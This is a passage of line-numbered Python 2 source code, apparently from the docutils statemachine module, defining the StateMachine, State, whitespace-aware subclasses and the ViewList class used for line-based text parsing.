( exception . args [ 1 ],) 160 if self . debug : 161 print >> self . _stderr , ( 162 ' \\n StateMachine.run: StateCorrection to state ' 163 '\" %s \", transition %s .' 164 % ( next_state , transitions [ 0 ])) 165 else : 166 transitions = None 167 state = self . get_state ( next_state ) 168 except : 169 if self . debug : 170 self . error () 171 raise 172 self . observers = [] 173 return results 174 175 def get_state ( self , next_state = None ): 176 \"\"\" 177 Return current state object; set it first if `next_state` given. 178 179 Parameter `next_state`: a string, the name of the next state. 180 181 Exception: `UnknownStateError` raised if `next_state` unknown. 182 \"\"\" 183 if next_state : 184 if self . debug and next_state != self . current_state : 185 print >> self . _stderr , ( 186 ' \\n StateMachine.get_state: Changing state from ' 187 '\" %s \" to \" %s \" (input line %s ).' 188 % ( self . current_state , next_state , 189 self . abs_line_number ())) 190 self . current_state = next_state 191 try : 192 return self . states [ self . current_state ] 193 except KeyError : 194 raise UnknownStateError ( self . current_state ) 195 196 def next_line ( self , n = 1 ): 197 \"\"\"Load `self.line` with the `n`'th next line and return it.\"\"\" 198 try : 199 try : 200 self . line_offset += n 201 self . line = self . input_lines [ self . line_offset ] 202 except IndexError : 203 self . line = None 204 raise EOFError 205 return self . line 206 finally : 207 self . notify_observers () 208 209 def is_next_line_blank ( self ): 210 \"\"\"Return 1 if the next line is blank or non-existant.\"\"\" 211 try : 212 return not self . input_lines [ self . line_offset + 1 ] . strip () 213 except IndexError : 214 return 1 215 216 def at_eof ( self ): 217 \"\"\"Return 1 if the input is at or past end-of-file.\"\"\" 218 return self . line_offset >= len ( self . input_lines ) - 1 219 220 def at_bof ( self ): 221 \"\"\"Return 1 if the input is at or before beginning-of-file.\"\"\" 222 return self . line_offset <= 0 223 224 def previous_line ( self , n = 1 ): 225 \"\"\"Load `self.line` with the `n`'th previous line and return it.\"\"\" 226 self . line_offset -= n 227 if self . line_offset < 0 : 228 self . line = None 229 else : 230 self . line = self . input_lines [ self . line_offset ] 231 self . notify_observers () 232 return self . line 233 234 def goto_line ( self , line_offset ): 235 \"\"\"Jump to absolute line offset `line_offset`, load and return it.\"\"\" 236 try : 237 try : 238 self . line_offset = line_offset - self . input_offset 239 self . line = self . input_lines [ self . line_offset ] 240 except IndexError : 241 self . line = None 242 raise EOFError 243 return self . line 244 finally : 245 self . notify_observers () 246 247 def get_source ( self , line_offset ): 248 \"\"\"Return source of line at absolute line offset `line_offset`.\"\"\" 249 return self . input_lines . source ( line_offset - self . input_offset ) 250 251 def abs_line_offset ( self ): 252 \"\"\"Return line offset of current line, from beginning of file.\"\"\" 253 return self . line_offset + self . input_offset 254 255 def abs_line_number ( self ): 256 \"\"\"Return line number of current line (counting from 1).\"\"\" 257 return self . line_offset + self . input_offset + 1 258 259 def get_source_and_line ( self , lineno = None ): 260 \"\"\"Return (source, line) tuple for current or given line number. 261 262 Looks up the source and line number in the `self.input_lines` 263 StringList instance to count for included source files. 264 265 If the optional argument `lineno` is given, convert it from an 266 absolute line number to the corresponding (source, line) pair. 267 \"\"\" 268 if lineno is None : 269 offset = self . line_offset 270 else : 271 offset = lineno - self . input_offset - 1 272 try : 273 src , srcoffset = self . input_lines . info ( offset ) 274 srcline = srcoffset + 1 275 except ( TypeError ): 276 # line is None if index is \"Just past the end\" 277 src , srcline = self . get_source_and_line ( offset + self . input_offset ) 278 return src , srcline + 1 279 except ( IndexError ): # `offset` is off the list 280 src , srcline = None , None 281 # raise AssertionError('cannot find line %d in %s lines' % 282 # (offset, len(self.input_lines))) 283 # # list(self.input_lines.lines()))) 284 # assert offset == srcoffset, str(self.input_lines) 285 # print \"get_source_and_line(%s):\" % lineno, 286 # print offset + 1, '->', src, srcline 287 # print self.input_lines 288 return ( src , srcline ) 289 290 def insert_input ( self , input_lines , source ): 291 self . input_lines . insert ( self . line_offset + 1 , '' , 292 source = 'internal padding after ' + source , 293 offset = len ( input_lines )) 294 self . input_lines . insert ( self . line_offset + 1 , '' , 295 source = 'internal padding before ' + source , 296 offset =- 1 ) 297 self . input_lines . insert ( self . line_offset + 2 , 298 StringList ( input_lines , source )) 299 300 def get_text_block ( self , flush_left = False ): 301 \"\"\" 302 Return a contiguous block of text. 303 304 If `flush_left` is true, raise `UnexpectedIndentationError` if an 305 indented line is encountered before the text block ends (with a blank 306 line). 307 \"\"\" 308 try : 309 block = self . input_lines . get_text_block ( self . line_offset , 310 flush_left ) 311 self . next_line ( len ( block ) - 1 ) 312 return block 313 except UnexpectedIndentationError , err : 314 block = err . args [ 0 ] 315 self . next_line ( len ( block ) - 1 ) # advance to last line of block 316 raise 317 318 def check_line ( self , context , state , transitions = None ): 319 \"\"\" 320 Examine one line of input for a transition match & execute its method. 321 322 Parameters: 323 324 - `context`: application-dependent storage. 325 - `state`: a `State` object, the current state. 326 - `transitions`: an optional ordered list of transition names to try, 327 instead of ``state.transition_order``. 328 329 Return the values returned by the transition method: 330 331 - context: possibly modified from the parameter `context`; 332 - next state name (`State` subclass name); 333 - the result output of the transition, a list. 334 335 When there is no match, ``state.no_match()`` is called and its return 336 value is returned. 337 \"\"\" 338 if transitions is None : 339 transitions = state . transition_order 340 state_correction = None 341 if self . debug : 342 print >> self . _stderr , ( 343 ' \\n StateMachine.check_line: state=\" %s \", transitions= %r .' 344 % ( state . __class__ . __name__ , transitions )) 345 for name in transitions : 346 pattern , method , next_state = state . transitions [ name ] 347 match = pattern . match ( self . line ) 348 if match : 349 if self . debug : 350 print >> self . _stderr , ( 351 ' \\n StateMachine.check_line: Matched transition ' 352 '\" %s \" in state \" %s \".' 353 % ( name , state . __class__ . __name__ )) 354 return method ( match , context , next_state ) 355 else : 356 if self . debug : 357 print >> self . _stderr , ( 358 ' \\n StateMachine.check_line: No match in state \" %s \".' 359 % state . __class__ . __name__ ) 360 return state . no_match ( context , transitions ) 361 362 def add_state ( self , state_class ): 363 \"\"\" 364 Initialize & add a `state_class` (`State` subclass) object. 365 366 Exception: `DuplicateStateError` raised if `state_class` was already 367 added. 368 \"\"\" 369 statename = state_class . __name__ 370 if statename in self . states : 371 raise DuplicateStateError ( statename ) 372 self . states [ statename ] = state_class ( self , self . debug ) 373 374 def add_states ( self , state_classes ): 375 \"\"\" 376 Add `state_classes` (a list of `State` subclasses). 377 \"\"\" 378 for state_class in state_classes : 379 self . add_state ( state_class ) 380 381 def runtime_init ( self ): 382 \"\"\" 383 Initialize `self.states`. 384 \"\"\" 385 for state in self . states . values (): 386 state . runtime_init () 387 388 def error ( self ): 389 \"\"\"Report error details.\"\"\" 390 type , value , module , line , function = _exception_data () 391 print >> self . _stderr , u ' %s : %s ' % ( type , value ) 392 print >> self . _stderr , 'input line %s ' % ( self . abs_line_number ()) 393 print >> self . _stderr , ( u 'module %s , line %s , function %s ' % 394 ( module , line , function )) 395 396 def attach_observer ( self , observer ): 397 \"\"\" 398 The `observer` parameter is a function or bound method which takes two 399 arguments, the source and offset of the current line. 400 \"\"\" 401 self . observers . append ( observer ) 402 403 def detach_observer ( self , observer ): 404 self . observers . remove ( observer ) 405 406 def notify_observers ( self ): 407 for observer in self . observers : 408 try : 409 info = self . input_lines . info ( self . line_offset ) 410 except IndexError : 411 info = ( None , None ) 412 observer ( * info ) 413 414 415 class State : 416 417 \"\"\" 418 State superclass. Contains a list of transitions, and transition methods. 419 420 Transition methods all have the same signature. They take 3 parameters: 421 422 - An `re` match object. ``match.string`` contains the matched input line, 423 ``match.start()`` gives the start index of the match, and 424 ``match.end()`` gives the end index. 425 - A context object, whose meaning is application-defined (initial value 426 ``None``). It can be used to store any information required by the state 427 machine, and the retured context is passed on to the next transition 428 method unchanged. 429 - The name of the next state, a string, taken from the transitions list; 430 normally it is returned unchanged, but it may be altered by the 431 transition method if necessary. 432 433 Transition methods all return a 3-tuple: 434 435 - A context object, as (potentially) modified by the transition method. 436 - The next state name (a return value of ``None`` means no state change). 437 - The processing result, a list, which is accumulated by the state 438 machine. 439 440 Transition methods may raise an `EOFError` to cut processing short. 441 442 There are two implicit transitions, and corresponding transition methods 443 are defined: `bof()` handles the beginning-of-file, and `eof()` handles 444 the end-of-file. These methods have non-standard signatures and return 445 values. `bof()` returns the initial context and results, and may be used 446 to return a header string, or do any other processing needed. `eof()` 447 should handle any remaining context and wrap things up; it returns the 448 final processing result. 449 450 Typical applications need only subclass `State` (or a subclass), set the 451 `patterns` and `initial_transitions` class attributes, and provide 452 corresponding transition methods. The default object initialization will 453 take care of constructing the list of transitions. 454 \"\"\" 455 456 patterns = None 457 \"\"\" 458 {Name: pattern} mapping, used by `make_transition()`. Each pattern may 459 be a string or a compiled `re` pattern. Override in subclasses. 460 \"\"\" 461 462 initial_transitions = None 463 \"\"\" 464 A list of transitions to initialize when a `State` is instantiated. 465 Each entry is either a transition name string, or a (transition name, next 466 state name) pair. See `make_transitions()`. Override in subclasses. 467 \"\"\" 468 469 nested_sm = None 470 \"\"\" 471 The `StateMachine` class for handling nested processing. 472 473 If left as ``None``, `nested_sm` defaults to the class of the state's 474 controlling state machine. Override it in subclasses to avoid the default. 475 \"\"\" 476 477 nested_sm_kwargs = None 478 \"\"\" 479 Keyword arguments dictionary, passed to the `nested_sm` constructor. 480 481 Two keys must have entries in the dictionary: 482 483 - Key 'state_classes' must be set to a list of `State` classes. 484 - Key 'initial_state' must be set to the name of the initial state class. 485 486 If `nested_sm_kwargs` is left as ``None``, 'state_classes' defaults to the 487 class of the current state, and 'initial_state' defaults to the name of 488 the class of the current state. Override in subclasses to avoid the 489 defaults. 490 \"\"\" 491 492 def __init__ ( self , state_machine , debug = False ): 493 \"\"\" 494 Initialize a `State` object; make & add initial transitions. 495 496 Parameters: 497 498 - `statemachine`: the controlling `StateMachine` object. 499 - `debug`: a boolean; produce verbose output if true. 500 \"\"\" 501 502 self . transition_order = [] 503 \"\"\"A list of transition names in search order.\"\"\" 504 505 self . transitions = {} 506 \"\"\" 507 A mapping of transition names to 3-tuples containing 508 (compiled_pattern, transition_method, next_state_name). Initialized as 509 an instance attribute dynamically (instead of as a class attribute) 510 because it may make forward references to patterns and methods in this 511 or other classes. 512 \"\"\" 513 514 self . add_initial_transitions () 515 516 self . state_machine = state_machine 517 \"\"\"A reference to the controlling `StateMachine` object.\"\"\" 518 519 self . debug = debug 520 \"\"\"Debugging mode on/off.\"\"\" 521 522 if self . nested_sm is None : 523 self . nested_sm = self . state_machine . __class__ 524 if self . nested_sm_kwargs is None : 525 self . nested_sm_kwargs = { 'state_classes' : [ self . __class__ ], 526 'initial_state' : self . __class__ . __name__ } 527 528 def runtime_init ( self ): 529 \"\"\" 530 Initialize this `State` before running the state machine; called from 531 `self.state_machine.run()`. 532 \"\"\" 533 pass 534 535 def unlink ( self ): 536 \"\"\"Remove circular references to objects no longer required.\"\"\" 537 self . state_machine = None 538 539 def add_initial_transitions ( self ): 540 \"\"\"Make and add transitions listed in `self.initial_transitions`.\"\"\" 541 if self . initial_transitions : 542 names , transitions = self . make_transitions ( 543 self . initial_transitions ) 544 self . add_transitions ( names , transitions ) 545 546 def add_transitions ( self , names , transitions ): 547 \"\"\" 548 Add a list of transitions to the start of the transition list. 549 550 Parameters: 551 552 - `names`: a list of transition names. 553 - `transitions`: a mapping of names to transition tuples. 554 555 Exceptions: `DuplicateTransitionError`, `UnknownTransitionError`. 556 \"\"\" 557 for name in names : 558 if name in self . transitions : 559 raise DuplicateTransitionError ( name ) 560 if name not in transitions : 561 raise UnknownTransitionError ( name ) 562 self . transition_order [: 0 ] = names 563 self . transitions . update ( transitions ) 564 565 def add_transition ( self , name , transition ): 566 \"\"\" 567 Add a transition to the start of the transition list. 568 569 Parameter `transition`: a ready-made transition 3-tuple. 570 571 Exception: `DuplicateTransitionError`. 572 \"\"\" 573 if name in self . transitions : 574 raise DuplicateTransitionError ( name ) 575 self . transition_order [: 0 ] = [ name ] 576 self . transitions [ name ] = transition 577 578 def remove_transition ( self , name ): 579 \"\"\" 580 Remove a transition by `name`. 581 582 Exception: `UnknownTransitionError`. 583 \"\"\" 584 try : 585 del self . transitions [ name ] 586 self . transition_order . remove ( name ) 587 except : 588 raise UnknownTransitionError ( name ) 589 590 def make_transition ( self , name , next_state = None ): 591 \"\"\" 592 Make & return a transition tuple based on `name`. 593 594 This is a convenience function to simplify transition creation. 595 596 Parameters: 597 598 - `name`: a string, the name of the transition pattern & method. This 599 `State` object must have a method called '`name`', and a dictionary 600 `self.patterns` containing a key '`name`'. 601 - `next_state`: a string, the name of the next `State` object for this 602 transition. A value of ``None`` (or absent) implies no state change 603 (i.e., continue with the same state). 604 605 Exceptions: `TransitionPatternNotFound`, `TransitionMethodNotFound`. 606 \"\"\" 607 if next_state is None : 608 next_state = self . __class__ . __name__ 609 try : 610 pattern = self . patterns [ name ] 611 if not hasattr ( pattern , 'match' ): 612 pattern = re . compile ( pattern ) 613 except KeyError : 614 raise TransitionPatternNotFound ( 615 ' %s .patterns[ %r ]' % ( self . __class__ . __name__ , name )) 616 try : 617 method = getattr ( self , name ) 618 except AttributeError : 619 raise TransitionMethodNotFound ( 620 ' %s . %s ' % ( self . __class__ . __name__ , name )) 621 return ( pattern , method , next_state ) 622 623 def make_transitions ( self , name_list ): 624 \"\"\" 625 Return a list of transition names and a transition mapping. 626 627 Parameter `name_list`: a list, where each entry is either a transition 628 name string, or a 1- or 2-tuple (transition name, optional next state 629 name). 630 \"\"\" 631 stringtype = type ( '' ) 632 names = [] 633 transitions = {} 634 for namestate in name_list : 635 if type ( namestate ) is stringtype : 636 transitions [ namestate ] = self . make_transition ( namestate ) 637 names . append ( namestate ) 638 else : 639 transitions [ namestate [ 0 ]] = self . make_transition ( * namestate ) 640 names . append ( namestate [ 0 ]) 641 return names , transitions 642 643 def no_match ( self , context , transitions ): 644 \"\"\" 645 Called when there is no match from `StateMachine.check_line()`. 646 647 Return the same values returned by transition methods: 648 649 - context: unchanged; 650 - next state name: ``None``; 651 - empty result list. 652 653 Override in subclasses to catch this event. 654 \"\"\" 655 return context , None , [] 656 657 def bof ( self , context ): 658 \"\"\" 659 Handle beginning-of-file. Return unchanged `context`, empty result. 660 661 Override in subclasses. 662 663 Parameter `context`: application-defined storage. 664 \"\"\" 665 return context , [] 666 667 def eof ( self , context ): 668 \"\"\" 669 Handle end-of-file. Return empty result. 670 671 Override in subclasses. 672 673 Parameter `context`: application-defined storage. 674 \"\"\" 675 return [] 676 677 def nop ( self , match , context , next_state ): 678 \"\"\" 679 A \"do nothing\" transition method. 680 681 Return unchanged `context` & `next_state`, empty result. Useful for 682 simple state changes (actionless transitions). 683 \"\"\" 684 return context , next_state , [] 685 686 687 class StateMachineWS ( StateMachine ): 688 689 \"\"\" 690 `StateMachine` subclass specialized for whitespace recognition. 691 692 There are three methods provided for extracting indented text blocks: 693 694 - `get_indented()`: use when the indent is unknown. 695 - `get_known_indented()`: use when the indent is known for all lines. 696 - `get_first_known_indented()`: use when only the first line's indent is 697 known. 698 \"\"\" 699 700 def get_indented ( self , until_blank = False , strip_indent = True ): 701 \"\"\" 702 Return a block of indented lines of text, and info. 703 704 Extract an indented block where the indent is unknown for all lines. 705 706 :Parameters: 707 - `until_blank`: Stop collecting at the first blank line if true. 708 - `strip_indent`: Strip common leading indent if true (default). 709 710 :Return: 711 - the indented block (a list of lines of text), 712 - its indent, 713 - its first line offset from BOF, and 714 - whether or not it finished with a blank line. 715 \"\"\" 716 offset = self . abs_line_offset () 717 indented , indent , blank_finish = self . input_lines . get_indented ( 718 self . line_offset , until_blank , strip_indent ) 719 if indented : 720 self . next_line ( len ( indented ) - 1 ) # advance to last indented line 721 while indented and not indented [ 0 ] . strip (): 722 indented . trim_start () 723 offset += 1 724 return indented , indent , offset , blank_finish 725 726 def get_known_indented ( self , indent , until_blank = False , strip_indent = True ): 727 \"\"\" 728 Return an indented block and info. 729 730 Extract an indented block where the indent is known for all lines. 731 Starting with the current line, extract the entire text block with at 732 least `indent` indentation (which must be whitespace, except for the 733 first line). 734 735 :Parameters: 736 - `indent`: The number of indent columns/characters. 737 - `until_blank`: Stop collecting at the first blank line if true. 738 - `strip_indent`: Strip `indent` characters of indentation if true 739 (default). 740 741 :Return: 742 - the indented block, 743 - its first line offset from BOF, and 744 - whether or not it finished with a blank line. 745 \"\"\" 746 offset = self . abs_line_offset () 747 indented , indent , blank_finish = self . input_lines . get_indented ( 748 self . line_offset , until_blank , strip_indent , 749 block_indent = indent ) 750 self . next_line ( len ( indented ) - 1 ) # advance to last indented line 751 while indented and not indented [ 0 ] . strip (): 752 indented . trim_start () 753 offset += 1 754 return indented , offset , blank_finish 755 756 def get_first_known_indented ( self , indent , until_blank = False , 757 strip_indent = True , strip_top = True ): 758 \"\"\" 759 Return an indented block and info. 760 761 Extract an indented block where the indent is known for the first line 762 and unknown for all other lines. 763 764 :Parameters: 765 - `indent`: The first line's indent (# of columns/characters). 766 - `until_blank`: Stop collecting at the first blank line if true 767 (1). 768 - `strip_indent`: Strip `indent` characters of indentation if true 769 (1, default). 770 - `strip_top`: Strip blank lines from the beginning of the block. 771 772 :Return: 773 - the indented block, 774 - its indent, 775 - its first line offset from BOF, and 776 - whether or not it finished with a blank line. 777 \"\"\" 778 offset = self . abs_line_offset () 779 indented , indent , blank_finish = self . input_lines . get_indented ( 780 self . line_offset , until_blank , strip_indent , 781 first_indent = indent ) 782 self . next_line ( len ( indented ) - 1 ) # advance to last indented line 783 if strip_top : 784 while indented and not indented [ 0 ] . strip (): 785 indented . trim_start () 786 offset += 1 787 return indented , indent , offset , blank_finish 788 789 790 class StateWS ( State ): 791 792 \"\"\" 793 State superclass specialized for whitespace (blank lines & indents). 794 795 Use this class with `StateMachineWS`. The transitions 'blank' (for blank 796 lines) and 'indent' (for indented text blocks) are added automatically, 797 before any other transitions. The transition method `blank()` handles 798 blank lines and `indent()` handles nested indented blocks. Indented 799 blocks trigger a new state machine to be created by `indent()` and run. 800 The class of the state machine to be created is in `indent_sm`, and the 801 constructor keyword arguments are in the dictionary `indent_sm_kwargs`. 802 803 The methods `known_indent()` and `firstknown_indent()` are provided for 804 indented blocks where the indent (all lines' and first line's only, 805 respectively) is known to the transition method, along with the attributes 806 `known_indent_sm` and `known_indent_sm_kwargs`. Neither transition method 807 is triggered automatically. 808 \"\"\" 809 810 indent_sm = None 811 \"\"\" 812 The `StateMachine` class handling indented text blocks. 813 814 If left as ``None``, `indent_sm` defaults to the value of 815 `State.nested_sm`. Override it in subclasses to avoid the default. 816 \"\"\" 817 818 indent_sm_kwargs = None 819 \"\"\" 820 Keyword arguments dictionary, passed to the `indent_sm` constructor. 821 822 If left as ``None``, `indent_sm_kwargs` defaults to the value of 823 `State.nested_sm_kwargs`. Override it in subclasses to avoid the default. 824 \"\"\" 825 826 known_indent_sm = None 827 \"\"\" 828 The `StateMachine` class handling known-indented text blocks. 829 830 If left as ``None``, `known_indent_sm` defaults to the value of 831 `indent_sm`. Override it in subclasses to avoid the default. 832 \"\"\" 833 834 known_indent_sm_kwargs = None 835 \"\"\" 836 Keyword arguments dictionary, passed to the `known_indent_sm` constructor. 837 838 If left as ``None``, `known_indent_sm_kwargs` defaults to the value of 839 `indent_sm_kwargs`. Override it in subclasses to avoid the default. 840 \"\"\" 841 842 ws_patterns = { 'blank' : ' *$' , 843 'indent' : ' +' } 844 \"\"\"Patterns for default whitespace transitions. May be overridden in 845 subclasses.\"\"\" 846 847 ws_initial_transitions = ( 'blank' , 'indent' ) 848 \"\"\"Default initial whitespace transitions, added before those listed in 849 `State.initial_transitions`. May be overridden in subclasses.\"\"\" 850 851 def __init__ ( self , state_machine , debug = False ): 852 \"\"\" 853 Initialize a `StateSM` object; extends `State.__init__()`. 854 855 Check for indent state machine attributes, set defaults if not set. 856 \"\"\" 857 State . __init__ ( self , state_machine , debug ) 858 if self . indent_sm is None : 859 self . indent_sm = self . nested_sm 860 if self . indent_sm_kwargs is None : 861 self . indent_sm_kwargs = self . nested_sm_kwargs 862 if self . known_indent_sm is None : 863 self . known_indent_sm = self . indent_sm 864 if self . known_indent_sm_kwargs is None : 865 self . known_indent_sm_kwargs = self . indent_sm_kwargs 866 867 def add_initial_transitions ( self ): 868 \"\"\" 869 Add whitespace-specific transitions before those defined in subclass. 870 871 Extends `State.add_initial_transitions()`. 872 \"\"\" 873 State . add_initial_transitions ( self ) 874 if self . patterns is None : 875 self . patterns = {} 876 self . patterns . update ( self . ws_patterns ) 877 names , transitions = self . make_transitions ( 878 self . ws_initial_transitions ) 879 self . add_transitions ( names , transitions ) 880 881 def blank ( self , match , context , next_state ): 882 \"\"\"Handle blank lines. Does nothing. Override in subclasses.\"\"\" 883 return self . nop ( match , context , next_state ) 884 885 def indent ( self , match , context , next_state ): 886 \"\"\" 887 Handle an indented text block. Extend or override in subclasses. 888 889 Recursively run the registered state machine for indented blocks 890 (`self.indent_sm`). 891 \"\"\" 892 indented , indent , line_offset , blank_finish = \\ 893 self . state_machine . get_indented () 894 sm = self . indent_sm ( debug = self . debug , ** self . indent_sm_kwargs ) 895 results = sm . run ( indented , input_offset = line_offset ) 896 return context , next_state , results 897 898 def known_indent ( self , match , context , next_state ): 899 \"\"\" 900 Handle a known-indent text block. Extend or override in subclasses. 901 902 Recursively run the registered state machine for known-indent indented 903 blocks (`self.known_indent_sm`). The indent is the length of the 904 match, ``match.end()``. 905 \"\"\" 906 indented , line_offset , blank_finish = \\ 907 self . state_machine . get_known_indented ( match . end ()) 908 sm = self . known_indent_sm ( debug = self . debug , 909 ** self . known_indent_sm_kwargs ) 910 results = sm . run ( indented , input_offset = line_offset ) 911 return context , next_state , results 912 913 def first_known_indent ( self , match , context , next_state ): 914 \"\"\" 915 Handle an indented text block (first line's indent known). 916 917 Extend or override in subclasses. 918 919 Recursively run the registered state machine for known-indent indented 920 blocks (`self.known_indent_sm`). The indent is the length of the 921 match, ``match.end()``. 922 \"\"\" 923 indented , line_offset , blank_finish = \\ 924 self . state_machine . get_first_known_indented ( match . end ()) 925 sm = self . known_indent_sm ( debug = self . debug , 926 ** self . known_indent_sm_kwargs ) 927 results = sm . run ( indented , input_offset = line_offset ) 928 return context , next_state , results 929 930 931 class _SearchOverride : 932 933 \"\"\" 934 Mix-in class to override `StateMachine` regular expression behavior. 935 936 Changes regular expression matching, from the default `re.match()` 937 (succeeds only if the pattern matches at the start of `self.line`) to 938 `re.search()` (succeeds if the pattern matches anywhere in `self.line`). 939 When subclassing a `StateMachine`, list this class **first** in the 940 inheritance list of the class definition. 941 \"\"\" 942 943 def match ( self , pattern ): 944 \"\"\" 945 Return the result of a regular expression search. 946 947 Overrides `StateMachine.match()`. 948 949 Parameter `pattern`: `re` compiled regular expression. 950 \"\"\" 951 return pattern . search ( self . line ) 952 953 954 class SearchStateMachine ( _SearchOverride , StateMachine ): 955 \"\"\"`StateMachine` which uses `re.search()` instead of `re.match()`.\"\"\" 956 pass 957 958 959 class SearchStateMachineWS ( _SearchOverride , StateMachineWS ): 960 \"\"\"`StateMachineWS` which uses `re.search()` instead of `re.match()`.\"\"\" 961 pass 962 963 964 class ViewList : 965 966 \"\"\" 967 List with extended functionality: slices of ViewList objects are child 968 lists, linked to their parents. Changes made to a child list also affect 969 the parent list. A child list is effectively a \"view\" (in the SQL sense) 970 of the parent list. Changes to parent lists, however, do *not* affect 971 active child lists. If a parent list is changed, any active child lists 972 should be recreated. 973 974 The start and end of the slice can be trimmed using the `trim_start()` and 975 `trim_end()` methods, without affecting the parent list. The link between 976 child and parent lists can be broken by calling `disconnect()` on the 977 child list. 978 979 Also, ViewList objects keep track of the source & offset of each item. 980 This information is accessible via the `source()`, `offset()`, and 981 `info()` methods. 982 \"\"\" 983 984 def __init__ ( self , initlist = None , source = None , items = None , 985 parent = None , parent_offset = None ): 986 self . data = [] 987 \"\"\"The actual list of data, flattened from various sources.\"\"\" 988 989 self . items = [] 990 \"\"\"A list of (source, offset) pairs, same length as `self.data`: the 991 source of each line and the offset of each line from the beginning of 992 its source.\"\"\" 993 994 self . parent = parent 995 \"\"\"The parent list.\"\"\" 996 997 self . parent_offset = parent_offset 998 \"\"\"Offset of this list from the beginning of the parent list.\"\"\" 999 1000 if isinstance ( initlist , ViewList ): 1001 self . data = initlist . data [:] 1002 self . items = initlist . items [:] 1003 elif initlist is not None : 1004 self . data = list ( initlist ) 1005 if items : 1006 self . items = items 1007 else : 1008 self . items = [( source , i ) for i in range ( len ( initlist ))] 1009 assert len ( self . data ) == len ( self . items ), 'data mismatch' 1010 1011 def __str__ ( self ): 1012 return str ( self . data ) 1013 1014 def __repr__ ( self ): 1015 return ' %s ( %s , items= %s )' % ( self . __class__ . __name__ , 1016 self . data , self . items ) 1017 1018 def __lt__ ( self , other ): return self . data < self . __cast ( other ) 1019 def __le__ ( self , other ): return self . data <= self . __cast ( other ) 1020 def __eq__ ( self , other ): return self . data == self . __cast ( other ) 1021 def __ne__ ( self , other ): return self . data != self . __cast ( other ) 1022 def __gt__ ( self , other ): return self . data > self . __cast ( other ) 1023 def __ge__ ( self , other ): return self . data >= self . __cast ( other ) 1024 def __cmp__ ( self , other ): return cmp ( self . data , self . __cast ( other )) 1025 1026 def __cast ( self , other ): 1027 if isinstance ( other , ViewList ): 1028 return other . data 1029 else : 1030 return other 1031 1032 def __contains__ ( self , item ): return item in self . data 1033 def __len__ ( self ): return len ( self . data ) 1034 1035 # The __getitem__()/__setitem__() methods check whether the index 1036 # is a slice first, since indexing a native list with a slice object 1037 # just works. 1038 1039 def __getitem__ ( self , i ): 1040 if isinstance ( i , types . SliceType ): 1041 assert i . step in ( None , 1 ), 'cannot handle slice with stride' 1042 return self . __class__ ( self . data [ i . start : i . stop ], 1043 items = self . items [ i . start : i . stop ], 1044 parent = self , parent_offset = i . start or 0 ) 1045 else : 1046 return self . data [ i ] 1047 1048 def __setitem__ ( self , i , item ): 1049 if isinstance ( i , types . SliceType ): 1050 assert i . step in ( None , 1 ), 'cannot handle slice with stride' 1051 if not isinstance ( item , ViewList ): 1052 raise TypeError ( 'assigning non-ViewList to ViewList slice' ) 1053 self . data [ i . start : i . stop ] = item . data 1054 self . items [ i . start : i . stop ] = item . items 1055 assert len ( self . data ) == len ( self . items ), 'data mismatch' 1056 if self . parent : 1057 self . parent [( i . start or 0 ) + self . parent_offset 1058 : ( i . stop or len ( self )) + self . parent_offset ] = item 1059 else : 1060 self . data [ i ] = item 1061 if self . parent : 1062 self . parent [ i + self . parent_offset ] = item 1063 1064 def __delitem__ ( self , i ): 1065 try : 1066 del self . data [ i ] 1067 del self . items [ i ] 1068 if self . parent : 1069 del self . parent [ i + self . parent_offset ] 1070 except TypeError : 1071 assert i . step is None , 'cannot handle slice with stride' 1072 del self . data [ i . start : i . stop ] 1073 del self . items [ i . start : i . stop ] 1074 if self . parent : 1075 del self . parent [( i . start or 0 ) + self . parent_offset 1076 : ( i . stop or len ( self )) + self . parent_offset ] 1077 1078 def __add__ ( self , other ): 1079 if isinstance ( other , ViewList ): 1080 return self . __class__ ( self . data + other . data , 1081 items = ( self . items + other . items )) 1082 else : 1083 raise TypeError ( 'adding non-ViewList to a ViewList' ) 1084 1085 def __radd__ ( self , other ): 1086 if isinstance ( other , ViewList ): 1087 return self . __class__ ( other . data + self . data , 1088 items = ( other . items + self . items )) 1089 else : 1090 raise TypeError ( 'adding ViewList to a non-ViewList' ) 1091 1092 def __iadd__ ( self , other ): 1093 if isinstance ( other , ViewList ): 1094 self . data += other . data 1095 else : 1096 raise TypeError ( 'argument to += must be a ViewList' ) 1097 return self 1098 1099 def __mul__ ( self , n ): 1100 return self . __class__ ( self . data * n , items = ( self . items * n )) 1101 1102 __rmul__ = __mul__ 1103 1104 def __imul__ ( self , n ): 1105 self . data *= n 1106 self . items *= n 1107 return self 1108 1109 def extend ( self , other ): 1110 if not isinstance ( other , ViewList ): 1111 raise TypeError ( 'extending a ViewList with a non-ViewList' ) 1112 if self . parent : 1113 self . parent . insert ( len ( self . data ) + self . parent_offset , other ) 1114 self . data . extend ( other . data ) 1115 self . items . extend ( other . items ) 1116 1117 def append ( self , item , source = None , offset = 0 ): 1118 if source is None : 1119 self . extend ( item ) 1120 else : 1121 if self . parent : 1122 self . parent . insert ( len ( self . data ) + self . parent_offset , item , 1123 source , offset ) 1124 self . data . append ( item ) 1125 self . items . append (( source , offset )) 1126 1127 def insert ( self , i , item , source = None , offset = 0 ): 1128 if source is None : 1129 if not isinstance ( item , ViewList ): 1130 raise TypeError ( 'inserting non-ViewList with no source given' ) 1131 self . data [ i : i ] = item . data 1132 self . items [ i : i ] = item . items 1133 if self . parent : 1134 index = ( len ( self . data ) + i ) % len ( self . data ) 1135 self . parent . insert ( index + self . parent_offset , item ) 1136 else : 1137 self . data . insert ( i , item ) 1138 self . items . insert ( i , ( source , offset )) 1139 if self . parent : 1140 index = ( len ( self . data ) + i ) % len ( self . data ) 1141 self . parent . insert ( index + self . parent_offset , item , 1142 source , offset ) 1143 1144 def pop ( self , i =- 1 ): 1145 if self . parent : 1146 index = ( len ( self . data ) + i ) % len ( self . data ) 1147 self . parent . pop ( index + self . parent_offset ) 1148 self . items . pop ( i ) 1149 return self . data . pop ( i ) 1150 1151 def trim_start ( self , n = 1 ): 1152 \"\"\" 1153 Remove items from the start of the list, without touching the parent. 1154 \"\"\" 1155 if n > len ( self . data ): 1156 raise IndexError ( \"Size of trim too large; can't trim %s items \" 1157 \"from a list of size %s .\" % ( n , len ( self . data ))) 1158 elif n < 0 : 1159 raise IndexError ( 'Trim size must be >= 0.' ) 1160 del self . data [: n ] 1161 del self . items [: n ] 1162 if self . parent : 1163 self . parent_offset += n 1164 1165 def trim_end ( self , n = 1 ): 1166 \"\"\" 1167 Remove items from the end of the list, without touching the parent. 1168 \"\"\" 1169 if n > len ( self . data ): 1170 raise IndexError ( \"Size of trim too large; can't trim %s items \" 1171 \"from a list of size %s .\" % 